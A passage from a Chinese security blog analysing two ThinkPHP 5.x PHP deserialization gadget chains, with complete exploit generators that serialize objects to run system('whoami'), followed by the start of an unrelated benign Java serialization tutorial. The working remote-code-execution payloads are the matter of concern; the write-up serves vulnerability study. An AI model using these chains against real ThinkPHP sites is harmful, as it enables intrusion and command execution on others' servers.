<p><img src="https://ae01.alicdn.com/kf/U8e3f924c78034285a8a1e3c82c79c3ce7.jpg"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;thinkphp&#x2F;library&#x2F;think&#x2F;model&#x2F;concern&#x2F;Conversion.php</span><br></pre></td></tr></table></figure>

<p>存在<code>_toString()</code></p>
<p><img src="https://ae01.alicdn.com/kf/U662f8ffb045e4216bf80f3a2ba789026B.jpg"></p>
<p><code>toJson()</code></p>
<p>调用<code>toArray()</code></p>
<p><img src="https://ae01.alicdn.com/kf/U461c285aba7b47d8b151dc337af9f213I.jpg"></p>
<p><code>toArray()</code></p>
<p>需要让<code>$this-&gt;visible</code>为空，<code>$this-&gt;hidden</code>为空，调用<code>getAttr()</code>。<code>$data</code>由<code>$this-&gt;data</code>和<code>$this-&gt;merge</code>合并而成。</p>
<p><img src="https://ae01.alicdn.com/kf/U0afb602c82f54d19999c9022498e7e718.jpg"></p>
<p><code>getAttr()</code>满足条件<code>isset($this-&gt;withAttr[$fieldName])</code>即可命令执行，参数可控</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$closure &#x3D; $this-&gt;withAttr[$fieldName];</span><br><span class="line">$value   &#x3D; $closure($value, $this-&gt;data);</span><br></pre></td></tr></table></figure>



<p><img src="https://ae01.alicdn.com/kf/U268db8f0b73d4aa996777ff2ce663d40V.jpg"></p>
<p><code>getData()</code>，需要满足第二个条件<code>$this-&gt;data</code>数组中存在<code>$name</code>键，即可返回<code>$this-&gt;data[$name]</code></p>
<p><img src="https://ae01.alicdn.com/kf/U814f07fd9107466a9da9c0e9dad752f4q.jpg"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;thinkphp&#x2F;library&#x2F;think&#x2F;Loader.php</span><br></pre></td></tr></table></figure>

<p><code>Loader::parseName</code></p>
<p>parseName会把大写字母转为小写并在前面加上_，如<code>A</code>变成<code>_a</code>，不影响payload的构造</p>
<p><img src="https://ae01.alicdn.com/kf/Uece731b7f26a4d57bdcf284ab22b2924Y.jpg"></p>
<p>函数名为<code>$closure = $this-&gt;withAttr[$fieldName];</code>，<code>$fieldName</code>来源于经过<code>Loader::parseName</code>函数处理的<code>getAttr()</code>函数参数<code>$name</code>，而<code>getAttr()</code>函数参数等于<code>$data</code>的键名<code>$key</code>，<code>$data</code>由<code>$this-&gt;data</code>和<code>$this-&gt;merge</code>合并而成。最终等于<code>$this-&gt;withAttr[$key]</code>。让数组<code>$this-&gt;withAttr</code>与<code>$this-&gt;data</code>有相同的键名即可</p>
<p>执行命令：<br><code>$value=$this-&gt;getData($name)</code>,<code>$name</code>为<code>getAttr()</code>参数，在<code>getData()</code>函数中只要满足<code>array_key_exists($name, $this-&gt;data</code>)就会返回<code>$this-&gt;data[$name]</code>，<code>$name</code>为传入参数等于键值$key，最终等于<code>$this-&gt;data[$key]</code>。</p>
<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>构造exp</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>&#123;</span><br><span class="line">    <span class="title">abstract</span> <span class="title">class</span> <span class="title">Model</span>&#123;</span><br><span class="line">        <span class="title">private</span> $<span class="title">withAttr</span> = [];</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$data</span> = [];</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;withAttr=[<span class="string">&#x27;a&#x27;</span>=&gt;<span class="string">&#x27;system&#x27;</span>];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;data=[<span class="string">&#x27;a&#x27;</span>=&gt;<span class="string">&#x27;whoami&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span> &#123;</span><br><span class="line">    <span class="title">use</span> \<span class="title">think</span>\<span class="title">Model</span>\<span class="title">Pivot</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">think</span>\<span class="title">Process</span>;</span><br><span class="line">    <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Pipes</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Windows</span> <span class="keyword">extends</span> <span class="title">Pipes</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$files</span> = [];</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;files=[<span class="keyword">new</span> Pivot()];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize(<span class="keyword">new</span> Windows()));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://ae01.alicdn.com/kf/U60abe354ddfc4d3e8d3e92a008178e45f.jpg"></p>
<h1 id="利用链2"><a href="#利用链2" class="headerlink" title="利用链2"></a>利用链2</h1><p>前面的触发点都一样，区别在<code>toArray()</code>这里</p>
<p><code>toArray()</code></p>
<p>调用<code>_call()</code>方法，首先遍历数组<code>$this-&gt;append</code>，当键值<code>$name</code>为数组时满足<code>is_array($name)</code>。让<code>$relation</code>等于类名即可触发<code>_call()</code></p>
<p>在这之前按需要满足3个条件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.$this-&gt;append不为空</span><br><span class="line">2.is_array($name)</span><br><span class="line">让$this-&gt;append等于二维数组，$this-&gt;append&#x3D;[$key-&gt;数组]</span><br><span class="line">3.!$relation</span><br><span class="line">构造$this-&gt;append[&#39;aaa&#39;]和 $this-&gt;relation&#x3D;[&#39;mmm&#39;&#x3D;&gt;&#39;&#39;];即可</span><br></pre></td></tr></table></figure>

<p><img src="https://ae01.alicdn.com/kf/U459391197d914340af21fc63a2aa0558i.jpg"></p>
<p><code>getRelation()</code></p>
<p>满足<code>array_key_exists($name, $this-&gt;relation)</code>就会返回<code>$this-&gt;relation[$name]</code>。<code>$name</code>就是<code>$this-&gt;append</code>数组中的键名。需要让<code>$this-&gt;relation[$name]</code>等于空才能满足<code>!$relation</code>执行下面的语句。</p>
<p><img src="https://ae01.alicdn.com/kf/U031c17d448de4072ac1f1cb6d26c64a8e.jpg"></p>
<p><code>getAttr()</code>返回$value，也就是经过<code>getData()</code>处理的参数<code>$key</code></p>
<p><img src="https://ae01.alicdn.com/kf/U268db8f0b73d4aa996777ff2ce663d40V.jpg"></p>
<p><code>getData()</code>，<code>$name</code>就是<code>$this-&gt;append</code>数组中的键名<code>$key</code>，最终返回<code>$this-&gt;data[$name]</code>，让它等于一个存在<code>__call()</code>方法且不存在<code>visable()</code>方法的类即可调用<code>__call</code></p>
<p><img src="https://ae01.alicdn.com/kf/U7297b1d24af04ccab240da1344f9df3dC.jpg"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">thinkphp&#x2F;library&#x2F;think&#x2F;Request.php</span><br></pre></td></tr></table></figure>

<p><code>__call()</code>,由于<code>array_unshift()</code>会修改参数数组，造成执行命令不可控，所以没办法直接利用这个<code>call_user_func_array</code>,只能寻找新的利用点</p>
<p><img src="https://ae01.alicdn.com/kf/Ua63f68ce9d2748798f794fb759e8cdb9k.jpg"></p>
<p><code>filterValue()</code>函数中存在<code>call_user_func</code>，但是<code>$value</code>不可控，不能直接利用</p>
<p><img src="https://ae01.alicdn.com/kf/Ufdada4a625b04e4295940acc23fae4c8A.jpg"></p>
<p><code>input()</code>函数中调用了<code>filterValue()</code>，参数不可控不能直接利用</p>
<p><img src="https://ae01.alicdn.com/kf/U42a605b070ab4f9c918ffe6ce97d5ef4G.jpg"></p>
<p><code>param()</code>函数调用<code>input()</code>，执行<code>$this-&gt;input($this-&gt;param, $name, $default, $filter);</code>，参数仍不可控。</p>
<p><img src="https://ae01.alicdn.com/kf/U15cd63721be540628c8127f9ae2d8163D.jpg"></p>
<p><code>isAjax()</code>调用<code>param()</code>，参数<code>$this-&gt;config[&#39;var_ajax&#39;]</code>可控，这样<code>param()</code>函数中的<code>$name</code>参数可控，这样<code>input()</code>函数中的<code>$name</code>可控。<code>param()</code>函数可以接收<code>$_GET</code>数组赋值给<code>$this-&gt;param</code>，这样<code>input()</code>函数的前两个参数<code>$this-&gt;param</code>和<code>$name</code>都可控了</p>
<p><img src="https://ae01.alicdn.com/kf/Uadedd1ace0724bae913a1bc5ca99c814S.jpg"></p>
<p>回到<code>input()</code>函数，传入<code>filterValue()</code>函数的第一个参数<code>$data</code>和第三个<code>$filter</code>是执行命令的关键。$data等于<code>$this-&gt;getData($data,$name)</code>，两个函数参数就是<code>input()</code>传入的参数<code>$this-&gt;param</code>和<code>$name</code>。而<code>$filter</code>等于<code>$this-&gt;getFilter($filter, $default);</code></p>
<p><img src="https://ae01.alicdn.com/kf/U42a605b070ab4f9c918ffe6ce97d5ef4G.jpg"></p>
<p><code>getData()</code>,最终<code>$data</code> = <code>$data[$val]</code> = <code>$data[$name]</code>，也就是<code>$this-&gt;param[$this-&gt;config[&#39;var_ajax&#39;]]</code></p>
<p><img src="https://ae01.alicdn.com/kf/Uec06295fde6b4fa8978eb6e3f5847e39t.jpg"></p>
<p><code>getFilter()</code>，<code>$filter</code>来源于<code>$this-&gt;filter</code></p>
<p><img src="https://ae01.alicdn.com/kf/U2f4c13e776b44f79ba1ba227bc0063b3G.jpg"></p>
<h2 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h2><p>构造exp</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Request</span>&#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">hook</span> = [];</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$config</span> = [</span><br><span class="line">            <span class="comment">// 表单请求类型伪装变量</span></span><br><span class="line">            <span class="string">&#x27;var_method&#x27;</span>       =&gt; <span class="string">&#x27;_method&#x27;</span>,</span><br><span class="line">            <span class="comment">// 表单ajax伪装变量</span></span><br><span class="line">            <span class="string">&#x27;var_ajax&#x27;</span>         =&gt; <span class="string">&#x27;_ajax&#x27;</span>,</span><br><span class="line">            <span class="comment">// 表单pjax伪装变量</span></span><br><span class="line">            <span class="string">&#x27;var_pjax&#x27;</span>         =&gt; <span class="string">&#x27;_pjax&#x27;</span>,</span><br><span class="line">            <span class="comment">// PATHINFO变量名 用于兼容模式</span></span><br><span class="line">            <span class="string">&#x27;var_pathinfo&#x27;</span>     =&gt; <span class="string">&#x27;s&#x27;</span>,</span><br><span class="line">            <span class="comment">// 兼容PATH_INFO获取</span></span><br><span class="line">            <span class="string">&#x27;pathinfo_fetch&#x27;</span>   =&gt; [<span class="string">&#x27;ORIG_PATH_INFO&#x27;</span>, <span class="string">&#x27;REDIRECT_PATH_INFO&#x27;</span>, <span class="string">&#x27;REDIRECT_URL&#x27;</span>],</span><br><span class="line">            <span class="comment">// 默认全局过滤方法 用逗号分隔多个</span></span><br><span class="line">            <span class="string">&#x27;default_filter&#x27;</span>   =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="comment">// 域名根，如thinkphp.cn</span></span><br><span class="line">            <span class="string">&#x27;url_domain_root&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="comment">// HTTPS代理标识</span></span><br><span class="line">            <span class="string">&#x27;https_agent_name&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="comment">// IP代理获取标识</span></span><br><span class="line">            <span class="string">&#x27;http_agent_ip&#x27;</span>    =&gt; <span class="string">&#x27;HTTP_X_REAL_IP&#x27;</span>,</span><br><span class="line">            <span class="comment">// URL伪静态后缀</span></span><br><span class="line">            <span class="string">&#x27;url_html_suffix&#x27;</span>  =&gt; <span class="string">&#x27;html&#x27;</span>,</span><br><span class="line">        ];</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$param</span> = [];</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$filter</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;hook=[<span class="string">&#x27;visible&#x27;</span>=&gt;[<span class="keyword">$this</span>,<span class="string">&#x27;isAjax&#x27;</span>]];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;config[<span class="string">&#x27;var_ajax&#x27;</span>]=<span class="string">&#x27;payload&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;param=[<span class="string">&#x27;payload&#x27;</span>=&gt;<span class="string">&#x27;whoami&#x27;</span>];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;filter=[<span class="string">&#x27;system&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$append</span> = [];</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$relation</span> = [];</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$data</span> = [];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;append=[<span class="string">&#x27;mmm&#x27;</span>=&gt;[]];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;data=[<span class="string">&#x27;mmm&#x27;</span>=&gt;<span class="keyword">new</span> Request()];<span class="comment">//等于new Request</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;relation=[<span class="string">&#x27;mmm&#x27;</span>=&gt;<span class="string">&#x27;&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="title">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>;</span><br><span class="line">    <span class="comment">//use think\Process;</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Windows</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$files</span> = [];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;files=[<span class="keyword">new</span> Pivot()];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize(<span class="keyword">new</span> Windows()));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<p><img src="https://ae01.alicdn.com/kf/U4bbf06ed57dd48b48e13e1b84f31bffbz.jpg"></p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-04-12T05:09:24.000Z" title="2021-04-12T05:09:24.000Z">2021-04-12</time>发表</span><span class="level-item"><time dateTime="2021-04-12T05:09:51.021Z" title="2021-04-12T05:09:51.021Z">2021-04-12</time>更新</span><span class="level-item">11 分钟读完 (大约1608个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/04/12/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/">java反序列化学习</a></h1><div class="content"><h1 id="Serializeable"><a href="#Serializeable" class="headerlink" title="Serializeable"></a>Serializeable</h1><p>Seializeable是java实现序列化机制的工具，序列化数据包含对象类型和属性值。</p>
<p>Serializeable工具的简单说明</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">只需要实现Serializeable接口就可以进行对象的序列化处理</span><br><span class="line">序列化对象可以是基本数据类型、集合类或其他对象</span><br><span class="line">使用transient、static关键字修饰的属性不会被序列化</span><br><span class="line">父类不可序列化时，需要父类中存在无参构造函数。</span><br></pre></td></tr></table></figure>

<p>相关接口和类</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">java.io.Serializable</span><br><span class="line">java.io.Externalizable  &#x2F;&#x2F;该接口需要实现writeExternal和readExternal函数控制序列化</span><br><span class="line">ObjectOutput</span><br><span class="line">ObjectInput</span><br><span class="line">ObjectOutputStream</span><br><span class="line">ObjectInputStream</span><br></pre></td></tr></table></figure>

<p>序列化</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//创建OutputStream对象</span></span><br><span class="line">OutputStream outputStream= <span class="keyword">new</span> FileOutputStream(<span class="string">&quot;serial&quot;</span>);</span><br><span class="line"><span class="comment">//将其封装到ObjectOutputStream对象中</span></span><br><span class="line">ObjectOutputStream objectOutputStream=<span class="keyword">new</span> ObjectOutputStream((outputStream));</span><br><span class="line"><span class="comment">//此后调用writeObject()对客完成对象的序列化，并将其发送给OutputStream</span></span><br><span class="line">objectOutputStream.writeObject(Object);</span><br><span class="line"><span class="comment">//关闭资源</span></span><br><span class="line">objectOutputStream.close();</span><br><span class="line">outputStream.close();</span><br></pre></td></tr></table></figure>

<p>反序列化</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//创建OutputStream对象</span></span><br><span class="line">InputStream inputStream=<span class="keyword">new</span> FileInputStream(<span class="string">&quot;serial&quot;</span>);</span><br><span class="line"><span class="comment">//将其封装到ObjectInputStream对象中</span></span><br><span class="line">ObjectInputStream objectInputStream=<span class="keyword">new</span> ObjectInputStream((inputStream));</span><br><span class="line"><span class="comment">//只需调用readObject(0即可完成对象的反序列化</span></span><br><span class="line">objectInputStream.readObject();</span><br><span class="line"><span class="comment">//关闭资源</span></span><br><span class="line">objectInputStream.close();</span><br><span class="line">inputStream.close();</span><br></pre></td></tr></table></figure>



<h2 id="Serializable接口"><a href="#Serializable接口" class="headerlink" title="Serializable接口"></a>Serializable接口</h2><p>一般一个类只要继承了Serializable接口，就代表该类和其子类都能进行JDK的序列化</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.tq;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyJavaSerialize</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">UInfo</span> <span class="keyword">implements</span> <span class="title">Serializable</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> String userName;</span><br><span class="line">        <span class="keyword">private</span>  <span class="keyword">int</span> userAge;</span><br><span class="line">        <span class="keyword">private</span>  String userAddress;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> String <span class="title">getUserName</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> userName;&#125;;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getUserAge</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> userAge;&#125;;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> String <span class="title">getUserAddress</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> userAddress;&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setUserName</span><span class="params">(String userName)</span></span>&#123;<span class="keyword">this</span>.userName=userName;&#125;;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setUserAge</span><span class="params">(<span class="keyword">int</span> userAge)</span></span>&#123;<span class="keyword">this</span>.userAge=userAge;&#125;;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setUserAddress</span><span class="params">(String userAddress)</span></span>&#123;<span class="keyword">this</span>.userAddress=userAddress;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        UInfo userInfo=<span class="keyword">new</span> UInfo();</span><br><span class="line">        userInfo.setUserAddress(<span class="string">&quot;a&quot;</span>);</span><br><span class="line">        userInfo.setUserAge(<span class="number">22</span>);</span><br><span class="line">        userInfo.setUserName(<span class="string">&quot;admin&quot;</span>);</span><br><span class="line"></span><br><span class="line">        OutputStream outputStream=<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;serial&quot;</span>);</span><br><span class="line">        ObjectOutputStream objectOutputStream=<span class="keyword">new</span> ObjectOutputStream(outputStream);</span><br><span class="line">        objectOutputStream.writeObject(userInfo);</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line">        outputStream.close();</span><br><span class="line"></span><br><span class="line">        InputStream inputStream=<span class="keyword">new</span> FileInputStream(<span class="string">&quot;serial&quot;</span>);</span><br><span class="line">        ObjectInputStream objectInputStream=<span class="keyword">new</span> ObjectInputStream(inputStream);</span><br><span class="line">        UInfo unserialUInfo=(UInfo) objectInputStream.readObject();</span><br><span class="line">        objectInputStream.close();</span><br><span class="line">        inputStream.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(unserialUInfo.userName);</span><br><span class="line">        System.out.println(unserialUInfo.userAge);</span><br><span class="line">        System.out.println(unserialUInfo.userAddress);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>输出结果，工程目录下会生成一个serial文件，其内容就是序列化后的数据</p>
<p><img src="https://www.hualigs.cn/image/6073d5c5e3da5.jpg"></p>
<h2 id="Externalizable接口"><a href="#Externalizable接口" class="headerlink" title="Externalizable接口"></a>Externalizable接口</h2><p>除了Serializable接口，java还提供了另一个序列化接口Externalizable，该接口继承自Serializable接口，但是有两个抽象函数：writeExternal和readExternal。需要自行实现两个函数来控制序列化流程，否则目标序列化类属性值会是类初始化后的默认值。</p>
<p>在使用Externalizable接口实现序列化时，读取对象会调用目标序列化类的无参构造函数去创建一个新的对象，再把徐磊话数据中的类属性值分别填充到新对象中。所以实现Externalizable接口的类必须提供一个public属性的无参构造函数</p>
<h2 id="serialVersionUID"><a href="#serialVersionUID" class="headerlink" title="serialVersionUID"></a>serialVersionUID</h2><p>目标序列化类有一个隐藏属性</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">private static final long serialVerionUID</span><br></pre></td></tr></table></figure>

